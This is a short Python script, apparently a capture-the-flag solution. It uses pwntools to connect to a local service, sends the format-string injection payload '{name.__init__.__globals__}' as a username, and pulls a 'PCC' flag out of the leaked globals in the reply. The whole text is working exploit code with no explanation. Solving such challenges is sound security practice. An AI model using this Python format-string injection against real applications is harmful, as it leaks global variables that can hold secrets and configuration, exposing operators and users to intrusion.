#!/usr/bin/env python3

from pwn import *
import re

context.log_level = 'error'

payload = "{name.__init__.__globals__}"

io = remote("localhost", 8000)
io.recvuntil(b"Before continuing, please identify yourself? ")
io.sendline(payload.encode())

io.recvuntil(b"Logged in as: ")
data = io.recvline().decode("utf-8").strip()

flag = re.findall(r"(PCC.*?})", data)[0]
print(f"Flag: {flag}")